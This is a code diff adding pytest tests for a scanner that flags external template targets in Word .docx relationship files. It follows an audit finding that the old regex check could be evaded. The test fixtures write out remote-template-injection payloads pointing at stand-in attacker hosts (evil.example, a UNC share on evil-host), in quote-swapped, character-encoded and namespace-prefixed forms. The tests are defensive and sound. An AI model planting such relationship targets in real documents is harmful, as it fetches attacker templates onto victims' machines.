@@ -294,3 +294,41 @@ def test_word_quit_runs_even_when_conversion_fails(tmp_path):
         with pytest.raises(RuntimeError, match="COM exploded"):
             office_via_com(str(src), ".docx")
     assert doc.Close.called and word.Quit.called
+
+
+# --- M5 (audit 2026-11-03): the regex-based .rels scan was bypassable. These three
+# shapes are valid XML that Word parses, but the old _REL_ATTR_RE missed them.
+
+def test_scan_flags_single_quoted_attributes(tmp_path):
+    p = _docx_with_rels(tmp_path,
+        "<Relationship Id='rId1' Type='.../attachedTemplate' "
+        "Target='https://evil.example/t.dotm' TargetMode='External'/>")
+    assert scan_ooxml_external_targets(p) == "https://evil.example/t.dotm"
+
+
+def test_scan_flags_character_reference_target(tmp_path):
+    # &#92; = backslash: the decoded target is the UNC path \\evil-host\share\t.dotm
+    p = _docx_with_rels(tmp_path,
+        '<Relationship Id="rId1" Type=".../attachedTemplate" '
+        'Target="&#92;&#92;evil-host&#92;share&#92;t.dotm" TargetMode="&#69;xternal"/>')
+    assert scan_ooxml_external_targets(p) == "\\\\evil-host\\share\\t.dotm"
+
+
+def test_scan_flags_prefixed_relationship_element(tmp_path):
+    rels = ('<?xml version="1.0"?>'
+            '<r:Relationships xmlns:r="http://schemas.openxmlformats.org/package/2006/relationships">'
+            '<r:Relationship Id="rId1" Type=".../attachedTemplate" '
+            'Target="https://evil.example/t.dotm" TargetMode="External"/>'
+            '</r:Relationships>')
+    path = tmp_path / "doc.docx"
+    with _zipfile.ZipFile(path, "w") as z:
+        z.writestr("[Content_Types].xml", "<Types/>")
+        z.writestr("word/document.xml", "<w:document/>")
+        z.writestr("word/_rels/settings.xml.rels", rels)
+    assert scan_ooxml_external_targets(str(path)) == "https://evil.example/t.dotm"
+
+
+def test_scan_fails_closed_on_unparseable_rels_xml(tmp_path):
+    from universal_importer.converters import SCAN_UNREADABLE
+    p = _docx_with_rels(tmp_path, "<Relationship unclosed")
+    assert scan_ooxml_external_targets(p) == SCAN_UNREADABLE
